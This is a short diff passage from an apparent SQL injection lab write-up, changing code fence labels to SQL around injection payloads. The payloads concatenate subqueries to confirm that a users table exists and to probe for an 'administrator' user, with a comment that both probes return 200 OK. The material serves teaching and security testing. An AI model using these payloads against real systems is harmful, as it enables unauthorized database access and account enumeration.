@@ -25,13 +25,13 @@
 ```
 - Confirm that the users table exists in the database
 
-```
+```SQL
 '||(select '' from users where rownum =1) ||' 
 --users table exists
 ```
 - Confirm that the administrator user exists in the users database
 
-```
+```SQL
 '||(select '' from users where username='administrator')||'
 '||(select '' from users where username='administratoruiwj')||'
 -- Both requests return a 200 OK because the SQL syntax itself is perfectly valid in both cases.
